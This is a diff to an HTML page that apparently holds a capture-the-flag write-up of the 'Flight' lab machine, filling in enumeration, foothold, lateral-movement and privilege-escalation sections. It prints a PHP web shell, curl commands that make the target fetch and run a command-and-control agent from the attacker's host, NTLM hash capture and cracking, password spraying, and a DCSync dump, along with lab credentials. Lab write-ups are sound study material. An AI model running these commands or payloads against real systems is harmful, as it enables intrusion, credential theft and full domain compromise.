@@ -27,8 +27,8 @@
 							<ul>
 								<li><a href="#enu" id="sec1-link"><span>Enumeration</span></a></li>
 								<li><a href="#foothold" id="sec2-link"><span>Foothold</span></a></li>
-								<li><a href="#privesc" id="sec3-link"><span>Privilege Escalation</span></a></li>
-								<li><a href="#lessons" id="sec4-link"><span>Lessons Learned</span></a></li>
+								<li><a href="#lateral" id="sec3-link"><span>Lateral Movement</span></a></li>
+								<li><a href="#privesc" id="sec4-link"><span>Privilege Escalation</span></a></li>
 							</ul>
 						</nav>
 
@@ -55,7 +55,7 @@
 					<div class="container">
 						<header>
 							<h2 style="text-align: center;">Flight</h2>
-							<div style="text-align: center;">Published: Feb 17, 2025</div>
+							<div style="text-align: center;">Published: Jun 29, 2025</div>
 							<div style="text-align: center;"><img src="images/flight/flight.png"></div>
 						</header>
 					</div>
@@ -64,58 +64,205 @@
 				<!-- Content -->
 					<section id="enu" class="two">
 						<div class="container">
-							
-							<header>
-								<h2>Enumeration</h2>
-							</header>
+							<div class="content">
+								<header>
+									<h2>Enumeration</h2>
+								</header>
 
-							<img src="images/flight/enu1.png">
-							<p>
-								Upon visiting http[:]//flight.htb, none of the buttons seem to do anything.
-								Let's further enumerate by looking for subdomains.
-							</p>
-							<img src="images/flight/enu2.png">
-							<pre><code>file_get_contents("C:\\xampp\\htdocs\\school.flight.htb\\home.html");</code></pre>
+								<h3>Scan</h3>
+								<pre>nmap -sC -sV -oN scans/detailed.nmap 10.10.11.187</pre>
+								<p>
+									<img src="images/flight/enu1.png">
+								</p>
+
+								<h3>Web</h3>
+								<p>
+									Going to <code>flight.htb</code> shows what seems to be a static site with no attack vectors.
+									<img src="images/flight/enu2.png">
+								</p>
+								<p>
+									Enumerating for subdomains:
+									<pre>ffuf -u http://10.10.11.187 -H "Host: FUZZ.flight.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --fs 7069</pre>
+									<img src="images/flight/enu3.png">
+								</p>
+
+								<h3>School Subdomain</h3>
+								<p>
+									This time, we notice that the server is using PHP, and the html content is being pulled via the <code>view</code> URL parameter
+									<img src="images/flight/enu4.png">
+								</p>
+								<p>
+									By changing the view parameter to <code>index.php</code>, we can view the source code. There seems to be some sort of security filter.
+									<img src="images/flight/enu5.png">
+								</p>
+							</div>
 						</div>
 					</section>
 
 					<section id="foothold" class="two">
 						<div class="container">
+							<div class="content">
+								<header>
+									<h2>Foothold</h2>
+								</header>
 
-							<header>
-								<h2>Foothold</h2>
-							</header>
+								<h3>Responder</h3>
+								<p>
+									The filter for backslashes is there as an attempt to stop the attack we will perform. 
+									We will be using an RFI to coerce the server into authenticating to an SMB server that we control to view a fake share, 
+									capturing the service account’s NTLMv2 hash in the process. Let’s use Responder to act as the malicious SMB server. 
+									We will get around the security filter by using forward slashes rather than backslashes.
+									<img src="images/flight/foo1.png">
+									<img src="images/flight/foo2.png">
+								</p>
+								<p>
+									Next, let’s crack the hash offline with <code>hashcat</code>
+									<pre>hashcat -m 5600 svc_apache.hash /usr/share/wordlists/rockyou.txt</pre>
+									The hash cracks pretty fast, giving us valid creds: <code>svc_apache:S@Ss!K@*t13</code> <br>
+								</p>
+								<p>
+									After some poking around in SMB shares, we don’t find anything too interesting with these creds.
+									<img src="images/flight/foo3.png">
+								</p>
 
-							<p>
-								Hello
-							</p>
+								<h3>Password Spray</h3>
+								<p>
+									One thing we can try is spray this password against all other users, testing for password reuse:
+									<pre># Get user list
+nxc smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users
+# Spray after grabbing the user list
+nxc smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success</pre>
+									<img src="images/flight/foo4.png">
+									More valid creds: <code>s.moon:S@Ss!K@*t13</code>
+								</p>
+							</div>
+						</div>
+					</section>
 
+					<section id="lateral" class="two">
+						<div class="container">
+							<div class="content">
+
+								<header>
+									<h2>Lateral Movement</h2>
+								</header>
+
+								<h3>NTLM Theft</h3>
+								<p>
+									With our new creds, let’s check our SMB access:
+									<pre>nxc smb 10.10.11.187 -u s.moon -p 'S@Ss!K@*t13' --shares</pre>
+									<img src="images/flight/lat1.png">
+								</p>
+								<p>
+									Now we have write access to the “Shared” share
+									Let’s try a similar attack as before using Responder, but this time, uploading a file that will cause the authentication attempt.<br>
+									To generate the payload, let’s use the following tool:<br>
+									<a href="https://github.com/Greenwolf/ntlm_theft">https://github.com/Greenwolf/ntlm_theft</a>
+									<pre>python3 ntlm_theft.py --generate all --server 10.10.14.11 --filename evil</pre>
+									<img src="images/flight/lat2.png">
+								</p>
+								<p>
+									With Responder still running, we will upload the desktop.ini payload to the “Shared” share
+									<img src="images/flight/lat3.png">
+								</p>
+								<p>
+									Cracking again with <code>hashcat</code>:
+									<pre>hashcat -m 5600 c.bum.hash /usr/share/wordlists/rockyou.txt</pre>
+									Creds: <code>c.bum:Tikkycoll_431012284</code> 
+								</p>
+
+								<h3>Web Shell</h3>
+								<p>
+									With the new creds, we have write perms on the web share:
+									<pre>nxc smb 10.10.11.187 -u s.moon -p 'S@Ss!K@*t13' --shares</pre>
+									<img src="images/flight/lat4.png">
+								</p>
+								<p>
+									Let’s upload a simple PHP shell as <code>cmd.php</code> to get RCE as <code>svc_apache</code>.<br>
+									PHP code:
+									<pre>&lt;?php system($_REQUEST['cmd']); ?></pre>
+								</p>
+								<p>
+									Uploading:
+									<img src="images/flight/lat5.png">
+								</p>
+								<h3>Mythic</h3>
+								<p>
+									We will be using <a href="https://github.com/its-a-feature/Mythic">Mythic</a> to manage callbacks, using apollo agents with a simple http profile.<br>
+									After building the apollo agent, let's deliver the payload with a simple python web server.<br>
+									Commands:
+									<pre># Download
+curl 'http://school.flight.htb/cmd.php?cmd=certutil.exe+-urlcache+-f+-split+http://10.10.14.11:8000/apollo.exe+C:\\Windows\\Tasks\\apollo.exe'
+# Execute
+curl 'http://school.flight.htb/cmd.php?cmd=C:\\Windows\\Tasks\\apollo.exe'</pre>
+									<img src="images/flight/lat6.png">
+								</p>
+								<p>
+									And we get a callback!
+									<img src="images/flight/lat7.png">
+								</p>
+								<p>
+									Now, we can move laterally to the “c.bum” user with the creds we got previously.
+									<pre>shell icacls "C:\Windows\Tasks\apollo.exe" /grant Everyone:F
+register_assembly # Pick RunasCs.exe
+execute_assembly -Assembly "RunasCs.exe -Arguments c.bum Tikkycoll_431012284 C:\Windows\Tasks\apollo.exe"</pre>
+									<img src="images/flight/lat8.png">
+									This gives us a callback as “c.bum”, which gives us <code>user.txt</code>
+								</p>
+							</div>
 						</div>
 					</section>
 
 					<section id="privesc" class="two">
 						<div class="container">
+							<div class="content">
 
-							<header>
-								<h2>Privilege Escalation</h2>
-							</header>
+								<header>
+									<h2>Privilege Escalation</h2>
+								</header>
 
-							<p>
-								Hello
-							</p>
-
-						</div>
-					</section>
-
-					<section id="lessons" class="two">
-						<div class="container">
-							<h3>Lessons learned:</h3>
-							<ul>
-								<li>Responder practice (RFI → ask for attacker’s SMB share & generating malicious desktop.ini</li>
-								<li>RunasCs.exe to execute commands as another user (and getting a shell as them)</li>
-								<li>Reverse port forwarding practice</li>
-								<li>Using Rubeus to craft ourselves a ticket, then using it after fixing clock skew</li>
-							</ul>
+								<h3>Enumeration</h3>
+								<p>
+									With some initial enumeration, we can see that there is IIS running on port 8000, and we have write access on <code>C:\inetpub\development</code>
+									<pre>shell netstat -ano | findstr LISTENING
+shell icacls development</pre>
+									<img src="images/flight/pe1.png">
+									<img src="images/flight/pe2.png">
+								</p>
+								<h3>IIS Abuse</h3>
+								<p>
+									First, let's start a socks proxy to access the internal site more easily.
+									<pre># In Mythic:
+socks5 7000</pre>
+									Adding FoxyProxy config:
+									<img src="images/flight/pe3.png">
+								</p>
+								<p>
+									Now we can access the internal IIS site from our browser:
+									<img src="images/flight/pe4.png">
+								</p>
+								<p>
+									A common way to abuse IIS is to upload a <code>.aspx</code> webshell, which we can do since we have write access. 
+									After using Mythic to upload the webshell, we navigate to it and get code execution as <code>IIS APPPOOL\DefaultAppPool</code>, 
+									which is a virtual account that we can use get system level access. Let's get a new callback then proceed with exploitation.
+									<img src="images/flight/pe5.png">
+								</p>
+								<p>
+									Let's use Rubeus to get a TGT
+									<img src="images/flight/pe6.png">
+								</p>
+								<p>
+									This gives us a ticket in kirbi base64 format, so let’s convert it to ccache then use it to perform a DCSync to grab Administrator credentials.
+									<pre>cat ticket.kirbi.b64 | base64 -d > ticket.kirbi
+impacket-ticketConverter ticket.kirbi ticket.ccache
+KRB5CCNAME=ticket.ccache faketime "$(ntpdate -q flight.htb | cut -d ' ' -f 1,2)" impacket-secretsdump -k -no-pass g0.flight.htb -just-dc-user Administrator -target-ip 10.10.11.187</pre>
+								<img src="images/flight/pe7.png">
+								</p>
+								<p>
+									Now, we can simple psexec to get a shell as SYSTEM
+									<img src="images/flight/pe8.png">
+								</p>
+							</div>
 						</div>
 					</section>
 			</div>
